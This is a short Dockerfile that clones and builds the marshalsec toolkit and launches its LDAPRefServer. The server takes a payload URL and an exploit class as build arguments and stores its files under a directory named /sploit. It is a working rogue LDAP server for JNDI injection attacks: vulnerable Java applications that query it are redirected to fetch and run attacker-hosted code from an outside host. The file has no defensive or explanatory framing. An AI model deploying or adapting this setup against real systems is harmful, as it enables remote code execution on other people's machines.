FROM jamesdbloom/docker-java8-maven
ARG PAYLOAD
ARG EXPLOIT_CLASS
ENV ENV_PAYLOAD=$PAYLOAD
ENV ENV_EXPLOIT_CLASS=$EXPLOIT_CLASS
ENV JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/jre
RUN mkdir -p /sploit/
WORKDIR /sploit/
RUN git clone https://github.com/mbechler/marshalsec.git
WORKDIR /sploit/marshalsec/
RUN mvn -f /sploit/marshalsec/pom.xml clean package -DskipTests
WORKDIR /sploit/
CMD ["sh", "-c", "/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -cp /sploit/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer ${ENV_PAYLOAD}#${ENV_EXPLOIT_CLASS}"]
#ENTRYPOINT ["tail", "-f", "/dev/null"]